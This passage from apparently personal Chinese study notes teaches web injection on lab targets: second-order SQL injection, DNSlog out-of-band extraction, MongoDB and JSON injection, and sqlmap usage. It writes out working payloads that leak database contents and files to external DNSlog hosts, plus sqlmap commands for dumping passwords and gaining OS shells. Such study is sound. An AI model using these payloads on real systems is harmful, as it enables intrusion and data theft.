alt="image-20240306192751893"></p><p>第一次的注入语句中的某些符号被转义了，但是仍被存储在数据库中，此时数据库中的注入语句的转义符是不会被存储进来的（即存储在数据库中的注入语句是完整的，只是尚未被拼接在SQL语句中）</p><p>第二次会请求第一次注入的数据，去执行SQL相关命令，此时因为程序可能认为已存储在数据库中的数据是安全的，就会直接调用其数据，并未对其进行转义等处理，使第一次的注入语句被完整调用，实现注入</p><h2 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h2><p>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p><p>第二步：引用恶意数据<br>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p><p>使用实例：</p><p>sqli-labs less-24</p><ol><li>如下点击注册用户</li></ol><p><img src="https://bu.dusays.com/2024/05/13/6641605a5e0bd.png" alt="image-20240306194217405"></p><p>这里注册用户名为 admin’#</p><p><img src="https://bu.dusays.com/2024/05/13/6641605a595ad.png" alt="image-20240306194232085"></p><p>此时我们查看数据库，注册的用户已经存储进去了，并且admin的密码是DDD</p><p><img src="https://bu.dusays.com/2024/05/13/6641605a6ca0b.png" alt="image-20240306194249406"></p><ol start="2"><li>对注册的账号进行登录然后修改密码为ccccc</li></ol><p><img src="https://bu.dusays.com/2024/05/13/6641605cacf82.png" alt="image-20240306194314534"></p><p>此时提示密码已经成功修改了</p><p><img src="https://bu.dusays.com/2024/05/13/6641605a52e7a.png" alt="image-20240306194328535"></p><p>此时我们发现反倒是admin的密码被修改成了ccccc，而我们注册的用户admin’#的密码并没有被修改</p><p><img src="https://bu.dusays.com/2024/05/13/6641605b1b9c4.png" alt="image-20240306194343196"></p><p>漏洞原因</p><ol><li><p>在进行用户注册的允许存在’和#这种特殊字符</p></li><li><p>在修改密码页面的源码中，发现这里很明显存在注入漏洞</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure><p>当我们登录账号admin’#并修改密码时，这条sql语句就变成了如下这个样子，#把后面的代码都注释掉了，所以修改了用户admin的密码为ccccc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure><h1 id="DNSlong注入"><a href="#DNSlong注入" class="headerlink" title="DNSlong注入"></a>DNSlong注入</h1><h2 id="前置-4"><a href="#前置-4" class="headerlink" title="前置"></a>前置</h2><h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p>dnslog注入也可以称之为dns带外查询，是一种注入姿势，可以通过查询相应的dns解析记录，来获取我们想要的数据</p><h3 id="使用场景："><a href="#使用场景：" class="headerlink" title="使用场景："></a>使用场景：</h3><p>一般情况下，在我们无法通过联合查询直接获取数据的情况下，我们只能通过盲注，来一步步的获取数据，但是，使用盲注，手工测试是需要花费大量的时间的，可能会想到使用sqlmap直接去跑出数据，但在实际测试中，使用sqlmap跑盲注，有很大的几率，网站把ip给封掉，此时就可以使用dnslong带外注入</p><h3 id="拓展："><a href="#拓展：" class="headerlink" title="拓展："></a>拓展：</h3><p>mysql中有个系统属性  secure_file_priv</p><blockquote><p>secure_file_priv为null    表示不允许导入导出 </p><p>secure_file_priv指定文件夹时  表示mysql的导入导出只能发生在指定的文件夹 </p><p>secure_file_priv没有设置时  则表示没有任何限制</p></blockquote><blockquote><p>LOAD_FILE()函数 </p><p>LOAD_FILE()函数读取一个文件并将其内容作为字符串返回 语法为：load_file(file_name)，其中file_name是文件的完整路径</p><p>使用条件：</p><p>文件必须位于服务器主机上<br>你必须具有该FILE权限才能读取该文件。拥有该FILE权限的用户可以读取服务器主机上的任何文件，该文件是world-readable的或MySQL服务器可读的，此属性与secure_file_priv状态相关<br>文件必须是所有人都可读的，并且它的大小小于max_allowed_packet字节</p></blockquote><p>UNC路径</p><blockquote><p>什么是UNC路径？</p><p>UNC路径就是类似\softer这样的形式的网络路径。它符合 \servername\sharename 格式，其中 servername 是服务器名，sharename 是共享资源的名称。</p><p>目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename。</p><p>例如把自己电脑的文件共享，你会获得如下路径，这就是UNC路径</p><p>&#x2F;&#x2F;iZ53sl3r1890u7Z&#x2F;Users&#x2F;Administrator&#x2F;Desktop&#x2F;111.txt</p><p><strong>这也就解释了为什么CONCAT()函数拼接了4个\了，双斜杠表示网络资源路径多加两个\就是转义了反斜杠。</strong></p></blockquote><blockquote><p>通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p><p>1、当secure_file_priv为空，就可以读取磁盘的目录。<br>2、当secure_file_priv为G:\，就可以读取G盘的文件。<br>3、当secure_file_priv为null，load_file就不能加载文件。</p></blockquote><p>使用DNSlog注入需要使用一个dns服务器用于记录我们注入的信息并返回一些有用的信息（类似于日志）</p><blockquote><p>DNSLOG平台 </p><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a>  （是临时的网址）</p><p><a href="http://admin.dnslog.link/">http://admin.dnslog.link</a> （不常用了）</p><p><a href="http://ceye.io/">http://ceye.io</a> （要注册）</p></blockquote><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><img src="https://bu.dusays.com/2024/05/13/6641605b4a234.png" alt="image-20240306211208664"></p><p><img src="https://bu.dusays.com/2024/05/13/6641605e22ff7.png" alt="image-20240306211243870"></p><p>我们注入的指令会被服务器发送给NS服务器 并被记录下来</p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>需要Mysql用户具备文件读取的权限，因为要借助到mysql的load_file读取文件的函数，权限不够的话，不能调用这个函数，其实只要mysql配置项中开启了secure_file_priv配置，就可以通过sql语句来执行文件读写操作</li><li>目标mysql数据库服务器能访问外网</li></ul><h2 id="使用-4"><a href="#使用-4" class="headerlink" title="使用"></a>使用</h2><h3 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;\\\\requests.xxxx.ceye.io\\aa&#x27;);</span><br><span class="line">select load_file(&#x27;\\\\xxxx.xxxx.xxx\\xx&#x27;);  xxxx.xxxx.xxx\\xx是某个网址</span><br><span class="line">这是最基本的用法，来看看利用盲注来回显。</span><br></pre></td></tr></table></figure><p>利用concat()函数将查询的数据库名和域名拼接，执行后查看DNSlog</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">或者构造</span><br><span class="line">payload：&#x27; and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxxx.ceye.io\\abc&#x27;))),1,0)--+</span><br></pre></td></tr></table></figure><p>查库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from member where id=1 and (select load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.xxxx.xxx.xxx/xx&#x27;)))</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">select * from member where id=1 and (select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxxx.xxx.xxx\\xx&#x27;)))</span><br></pre></td></tr></table></figure><p>查表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆第一个表名</span><br><span class="line">and (select load_file(concat(&#x27;\\\\&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;.xxx.xxx.xxx\\xxx&#x27;)))</span><br><span class="line">爆第二个表名</span><br><span class="line">and (select load_file(concat(&#x27;\\\\&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 1,1),&#x27;.xxx.xxx.xxx\\xxx&#x27;)))</span><br><span class="line">爆第三个表名</span><br><span class="line">and (select load_file(concat(&#x27;\\\\&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 2,1),&#x27;.xxx.xxx.xxx\\xxx&#x27;)))</span><br></pre></td></tr></table></figure><p>查字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select load_file(concat(&#x27;\\\\&#x27;,(select column_name from information_schema.column where table_schema=database() and table_name=&#x27;member&#x27; limit 0,1),&#x27;.xxx.xxx.xx\\xx&#x27;)))</span><br></pre></td></tr></table></figure><h3 id="配合xss"><a href="#配合xss" class="headerlink" title="配合xss"></a>配合xss</h3><p>XSS 盲打在安全测试的时候是比较常用的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: &quot;&lt;script src=http://XSS.XXXXX.ceye.io&gt;&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="配合SSRF"><a href="#配合SSRF" class="headerlink" title="配合SSRF"></a>配合SSRF</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: &quot;... &lt;!ENTITY test SYSTEM &quot;SSRF.xxxx.ceye.io\\aa&quot;&gt; ...&quot;</span><br></pre></td></tr></table></figure><h3 id="配合XXE"><a href="#配合XXE" class="headerlink" title="配合XXE"></a>配合XXE</h3><p>当我们遇到XXE，如果这个XXE漏洞可以解析外部实体，那么不用说，就可以拿来读取本地服务器文件，这时，我们只需把dtd文件改成这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://XXXX.ceye.io/%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><h3 id="配合命令执行"><a href="#配合命令执行" class="headerlink" title="配合命令执行"></a>配合命令执行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: &quot; ping %PATH%.pxxx.ceye.io ...&quot;</span><br></pre></td></tr></table></figure><h1 id="MongoDB-注入"><a href="#MongoDB-注入" class="headerlink" title="MongoDB 注入"></a>MongoDB 注入</h1><p>要考 遇到了再学 先放在这里   已学</p><h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>MongoDB是一个基于分布式文件存储的数据库，是一个介于关系数据库和非关系数据库之间的产品，它的特点是高性能、易部署、易使用，存储数据非常方便，默认情况下是没有认证的这就导致不熟悉它的研发人员部署后没有做访问控制导致可以未授权登录。</p><p><strong>MongoDB 与几乎支持相同语法的SQL数据库相反，NoSQL数据库具有不同的语法。</strong></p><p>实现MongoDB 注入：</p><p>在登录时，如果是mysql这种关系型的数据库，我们可以构造真值等式来绕过。如 or 1&#x3D;1。 在nosql中同样可以，nosql中的 || 1&#x3D;&#x3D;1 相当于在sql中的 or 1&#x3D;1 。 那么我们可以这样绕过：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=fujieace&#x27; || 1==1 //</span><br></pre></td></tr></table></figure><p>在攻击前，我们需要先建立一个集合，作为攻击的基础。</p><p>用户test是攻击者已经知道账号密码的一个测试账号，其他账号的话密码随机。想通过注入获取其他账号的密码。</p><h2 id="1-数组绑定时的注入"><a href="#1-数组绑定时的注入" class="headerlink" title="1.数组绑定时的注入"></a>1.数组绑定时的注入</h2><p>一个数组绑定的查询demo如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!php</span><br><span class="line">&lt;?php</span><br><span class="line">$mongo = new mongoclient();</span><br><span class="line">$db = $mongo-&gt;myinfo; //选择数据库</span><br><span class="line">$coll = $db-&gt;test; //选择集合</span><br><span class="line">$username = $_GET[&#x27;username&#x27;];</span><br><span class="line">$password = $_GET[&#x27;password&#x27;];</span><br><span class="line">$data = array(</span><br><span class="line">        &#x27;username&#x27;=&gt;$username,</span><br><span class="line">        &#x27;password&#x27;=&gt;$password</span><br><span class="line">        );</span><br><span class="line">$data = $coll-&gt;find($data);</span><br><span class="line">$count = $data-&gt;count();</span><br><span class="line">if ($count&gt;0) &#123;</span><br><span class="line">    foreach ($data as $user) &#123;</span><br><span class="line">        echo &#x27;username:&#x27;.$user[&#x27;username&#x27;].&quot;&lt;/br&gt;&quot;;</span><br><span class="line">        echo &#x27;password:&#x27;.$user[&#x27;password&#x27;].&quot;&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;未找到&#x27;;</span><br></pre></td></tr></table></figure><p>此时的攻击利用了php可以传递数组参数的一个特性。</p><p>当传入的url为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/2.php?username=test&amp;password=test</span><br></pre></td></tr></table></figure><p>执行了语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.test.find(&#123;username:‘test’,password:‘test’&#125;);</span><br></pre></td></tr></table></figure><p>如果此时传入的url如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/2.php?username[xx]=test&amp;password=test</span><br></pre></td></tr></table></figure><p>则$username就是一个数组，也就相当于执行了php语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!php</span><br><span class="line">$data = array(</span><br><span class="line">&#x27;username&#x27;=&gt;array(&#x27;xx&#x27;=&gt;&#x27;test&#x27;),</span><br><span class="line">&#x27;password&#x27;=&gt;&#x27;test&#x27;);</span><br></pre></td></tr></table></figure><p>此时的攻击利用了php可以传递数组参数的一个特性。</p><p>当传入的url为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/2.php?username=test&amp;password=test</span><br></pre></td></tr></table></figure><p>执行了语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.test.find(&#123;username:&#x27;test&#x27;,password:&#x27;test&#x27;&#125;);</span><br></pre></td></tr></table></figure><p>如果此时传入的url如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/2.php?username[xx]=test&amp;password=test</span><br></pre></td></tr></table></figure><p>则$username就是一个数组，也就相当于执行了php语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!php</span><br><span class="line">$data = array(</span><br><span class="line">&#x27;username&#x27;=&gt;array(&#x27;xx&#x27;=&gt;&#x27;test&#x27;),</span><br><span class="line">&#x27;password&#x27;=&gt;&#x27;test&#x27;);</span><br></pre></td></tr></table></figure><p>而mongodb对于多维数组的解析使最终执行了如下语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.test.find(&#123;username:&#123;&#x27;xx&#x27;:&#x27;test&#x27;&#125;,password:&#x27;test&#x27;&#125;);</span><br></pre></td></tr></table></figure><p>利用此特性，我们可以传入数据，是数组的键名为一个操作符（大于，小于，等于，不等于等等），完成一些攻击者预期的查询。</p><p>如，传入url:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/2.php?username[$ne]=test&amp;password[$ne]=test</span><br></pre></td></tr></table></figure><p>因为传入的键名$ne正是一个mongodb操作符，最终执行了语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.test.find(&#123;username:&#123;&#x27;$ne&#x27;:&#x27;test&#x27;&#125;,password:&#123;&#x27;$ne&#x27;:&#x27;test&#x27;&#125;&#125;);</span><br></pre></td></tr></table></figure><p>这句话相当于sql:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where username!=&#x27;test&#x27; and password!=&#x27;test&#x27;;</span><br></pre></td></tr></table></figure><p>如果此时的用户名与密码不能回显，只是返回一个逻辑上的正误判断。</p><p>那么我们可以采用$regex操作符来一位一位获取数据。</p><h2 id="2-拼接字符串时的注入"><a href="#2-拼接字符串时的注入" class="headerlink" title="2.拼接字符串时的注入"></a>2.拼接字符串时的注入</h2><p>攻击方式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&amp;password=test</span><br></pre></td></tr></table></figure><p>报错。 想办法闭合语句。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);return &#123;username:1,password:2&#125;//&amp;password=test</span><br></pre></td></tr></table></figure><p>该语句能返回一个数组，username键值是1，password键值是2.</p><p>爆mongodb版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);return &#123;username:tojson(db.getCollectionNames()),password:2&#125;;//&amp;password=test</span><br></pre></td></tr></table></figure><p>爆所有集合名</p><p>因为db.getCollectionNames()返回的是数组，需要用tojson转换为字符串。并且mongodb函数区分大小写。</p><p>爆test集合的第一条数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);return &#123;username:tojson(db.test.find()[0]),password:2&#125;;//&amp;password=test</span><br></pre></td></tr></table></figure><p>爆test集合的第二条数据</p><p>因为execute方法支持多语句执行，所以可以执行太多语句了，不演示~</p><p>当然，有时可能遇到没有输出返回数据，这时候怎么办呢？</p><p>在高版本下，添加了一个函数sleep()，就是时间盲注咯~</p><p>在高版本下，貌似不能用注释语句，此外高版本还有一个新特性就是默认开启错误回显。笔者尝试没有注释成功，只能用闭合的方法。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);if (db.version() &gt; &quot;0&quot;) &#123; sleep(10000); exit; &#125;var b=(&#123;a:&#x27;1&amp;password=test</span><br></pre></td></tr></table></figure><h1 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h1><h2 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h2><p>把参数中转一下，再发送到指定网址上去，可以对请求携带的参数进行二次加工</p><p>有一说一 我感觉这只能是对题的见招拆招，说是一种单独的注入方式感觉有点草率了</p><p>这类题，会将我们注入的语句发送到指定网址进行一些处理（加密等）再发送出去</p><p>所以我们可以直接BP抓包发给重发器处理后发出去或这写一个php文件将数据直接进行相应的处理（用url拼接 file_get_contents读取文件 $_GET获取参数）然后直接访问这个文件进行传参，让这个文件来访问 注入成功可能会有回显</p><h2 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h2><p>好吧 感觉又是像中转注入一样 </p><p>伪静态：看似是静态页面实则是动态页面</p><p>伪静态 动态 静态在url上有差别</p><p><img src="https://bu.dusays.com/2024/05/13/6641605db649d.png" alt="image-20240306202112544"></p><p>伪静态的url可能会有数字等 让后端能明白要调用那个文件</p><p>剩下的就和正常的sql注入一样了</p><h2 id="json注入"><a href="#json注入" class="headerlink" title="json注入"></a>json注入</h2><p>也是几乎不考 先放在这里 考了再学</p><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h3><p>JSON是一种轻量级的数据交换格式，易于阅读和编写，同时也易于机器解析和生成。它是基于JavaScript的一个子集，JSON采用完全独立于语言的文本格式，但是也使用类似于C语言家族的习惯（C、C#、C++、Java、JavaScript、Perl、Python等都可以使用JSON），这些特性使JSON成为理想的数据交换语言。<br>JSON可以将JavaScript中的对象转换为字符串，然后在函数、网络之间传递这个字符串。</p><h3 id="2、JSON结构"><a href="#2、JSON结构" class="headerlink" title="2、JSON结构"></a>2、JSON结构</h3><p>JSON建构于两种结构：<br>①“名称&#x2F;值”对的集合。不同的语言中，它被理解为对象（object），纪录（record），结构（struct），字典（dictionary），哈希表（hash table），有键列表（keyed list），或者关联数组 （associative array）。<br>②值的有序列表。在大部分语言中，它被理解为数组（array）。</p><p>例如：下面一段示例使JSON最简单的Key-Value示例（名称-值对，键值对）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;Username&quot;:&quot;xsser&quot;&#125;</span><br><span class="line">&#123;&quot;Username&quot;:&quot;xsser&quot;,&quot;Password&quot;:&quot;12345&quot;,&quot;Email&quot;:&quot;1234@st.com&quot;&#125;</span><br><span class="line"></span><br><span class="line">当需要表示一组值的时候，JSON不但能够提供高可读性，而且可以减少复杂性。</span><br><span class="line">例如表示一个管理员表，在JSON中，如下：</span><br><span class="line">&#123;&quot;Users&quot;:[</span><br><span class="line">&#123;&quot;Username&quot;:&quot;zhangsan&quot;,&quot;Password&quot;:&quot;12345&quot;,&quot;Email&quot;:&quot;12345@st.com&quot;&#125;</span><br><span class="line">&#123;&quot;Username&quot;:&quot;lisi&quot;,&quot;Password&quot;:&quot;123123&quot;,&quot;Email&quot;:&quot;123123@st.com&quot;&#125;</span><br><span class="line">&#123;&quot;Username&quot;:&quot;wangwu&quot;,&quot;Password&quot;:&quot;321321&quot;,&quot;Email&quot;:&quot;321321@st.com&quot;&#125;</span><br><span class="line">]  &#125;</span><br></pre></td></tr></table></figure><h3 id="3-JSON注入"><a href="#3-JSON注入" class="headerlink" title="3.JSON注入"></a>3.JSON注入</h3><p>JSON注入是指应用程序所解析的JSON数据来源于不可信赖的数据源，程序没有对这些不可信赖的数据进行验证、过滤，如果应用程序使用未经验证的输入构造 JSON，则可以更改 JSON 数据的语义。在相对理想的情况下，攻击者可能会插入无关的元素，导致应用程序在解析 JSON数据时抛出异常。<br>在JSON中是根据引号（”）、冒号（:）、逗号（,）、花括号（{}）来区分各字符的意义的。如果向JSON中注入恶意字符，那么JSON将解析失败。<br>例如：输入的Password值为：admin”1，那么在JSON语句中为：“password”：“admin”1”，为了”password”：“admin”1”成功解析，我们可以把”admin”1”转换为”admin”1”。<br>JSON注入和XML注入、SQL注入一样，都需要对影响语句的内容进行转义，如双引号、花括号等。</p><h3 id="4-如何避免-JSON-注入"><a href="#4-如何避免-JSON-注入" class="headerlink" title="4.如何避免 JSON 注入"></a>4.如何避免 JSON 注入</h3><p>1、检查程序逻辑，根据实际需求对数据进行合理过滤和安全校验，以避免产生JSON注入。</p><p>2、后台代码对Json数据进行编码</p><p>JsonStringEncoder</p><p>3、使用安全json parser防止json注入</p><h1 id="SQLMAP使用"><a href="#SQLMAP使用" class="headerlink" title="SQLMAP使用"></a>SQLMAP使用</h1><p>首先，SQLMap是一个自动化的SQL注入工具</p><p>kali内自带SQLMAP，用-h参数查看sqlmap的参数与使用方法</p><p>kali中直接输入sqlmap即可使用</p><h2 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h2><p><img src="https://bu.dusays.com/2024/05/13/6641605eb068a.png" alt="image-20240309190754619"></p><h2 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r http.txt  #http.txt是我们抓取的http的请求包</span><br><span class="line">sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测</span><br><span class="line">sqlmap -u &quot;http://www.xx.com/username/admin*&quot;       #如果我们已经知道admin这里是注入点的话，可以在其后面加个*来让sqlmap对其注入</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;   #探测该url是否存在漏洞</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;   --cookie=&quot;抓取的cookie&quot;   #当该网站需要登录时，探测该url是否存在漏洞</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;  --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot;  #抓取其post提交的数据填入</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --users      #查看数据库的所有用户</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --passwords  #查看数据库用户名的密码</span><br><span class="line">有时候使用 --passwords 不能获取到密码，则可以试下</span><br><span class="line">-D mysql -T user -C host,user,password --dump  当MySQL&lt; 5.7时</span><br><span class="line">-D mysql -T user -C host,user,authentication_string --dump  当MySQL&gt;= 5.7时</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --current-user  #查看数据库当前的用户</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --is-dba    #判断当前用户是否有管理员权限</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --roles     #列出数据库所有管理员角色，仅适用于oracle数据库的时候</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;    --dbs        #爆出所有的数据库</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;    --tables     #爆出所有的数据表</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;    --columns    #爆出数据库中所有的列</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;    --current-db #查看当前的数据库</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security --tables #爆出数据库security中的所有的表</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users --columns #爆出security数据库中users表中的所有的列</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users -C username --dump --start 1 --stop 100  #爆出数据库security中的users表中的username列中的前100条数据</span><br><span class="line"> </span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users --dump-all #爆出数据库security中的users表中的所有数据</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security --dump-all   #爆出数据库security中的所有数据</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --dump-all  #爆出该数据库中的所有数据</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;  --tamper=space2comment.py  #指定脚本进行过滤，用/**/代替空格</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --sql-shell  #执行指定的sql语句</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --os-shell/--os-cmd   #执行--os-shell命令，获取目标服务器权限</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --os-pwn   #执行--os-pwn命令，将目标权限弹到MSF上</span><br><span class="line"> </span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --file-read &quot;c:/test.txt&quot; #读取目标服务器C盘下的test.txt文件</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --file-write  test.txt  --file-dest &quot;e:/hack.txt&quot;  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --dbms=&quot;MySQL&quot;     #指定其数据库为mysql </span><br><span class="line">其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, sqli-labste, Sybase, Vertica, eXtremeDB</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --random-agent   #使用任意的User-Agent爆破</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --proxy=&quot;http://127.0.0.1:8080&quot;    #指定代理</span><br><span class="line">当爆破HTTPS网站会出现超时的话，可以使用参数 --delay=3 --force-ssl</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --technique T    #指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。</span><br><span class="line">支持的探测方式如下：</span><br><span class="line">　　B: Boolean-based blind SQL injection（布尔型注入）</span><br><span class="line">　　E: Error-based SQL injection（报错型注入）</span><br><span class="line">　　U: UNION query SQL injection（可联合查询注入）</span><br><span class="line">　　S: Stacked queries SQL injection（可多语句查询注入）</span><br><span class="line">　　T: Time-based blind SQL injection（基于时间延迟注入）</span><br><span class="line">  </span><br><span class="line">sqlmap -d &quot;mysql://root:root@127.0.0.130:3306/mysql&quot; --os-shell   #知道网站的账号密码直接连接</span><br><span class="line"> </span><br><span class="line">-v3                   #输出详细度  最大值5 会显示请求包和回复包</span><br><span class="line">--threads 5           #指定线程数</span><br><span class="line">--fresh-queries       #清除缓存</span><br><span class="line">--flush-session       #清空会话，重构注入 </span><br><span class="line">--batch               #对所有的交互式的都是默认的</span><br><span 